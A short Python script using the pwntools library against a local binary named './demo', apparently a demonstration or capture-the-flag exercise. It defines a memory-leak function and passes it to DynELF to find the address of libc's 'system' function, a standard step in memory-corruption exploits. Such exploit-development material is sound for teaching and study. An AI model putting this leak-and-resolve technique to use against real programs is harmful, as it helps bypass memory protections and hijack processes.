from pwn import *
context.arch = 'amd64'
context.bytes = 8

p = process("./demo", stderr=2)

def leak(address):
    p.pack(address)
    return p.recvn(8)

addr = p.unpack()
d = DynELF(leak, addr)
log.info("system: %#x" % d.lookup('system', 'libc.so'))

